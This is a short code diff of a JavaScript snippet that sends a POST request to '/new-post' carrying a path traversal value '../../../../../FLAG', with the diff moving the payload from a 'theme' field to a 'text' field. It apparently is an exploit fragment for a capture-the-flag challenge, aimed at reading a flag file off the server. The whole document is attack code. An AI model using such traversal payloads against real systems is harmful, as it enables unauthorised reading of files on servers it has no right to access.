@@ -1,4 +1,4 @@
-var post_data = 'submit-template=test&theme=../../../../../FLAG';
+var post_data = 'title=TestTitle&text=../../../../../FLAG';
 var xmlhttp = new XMLHttpRequest();
 xmlhttp.open("POST", "/new-post", true);
 xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
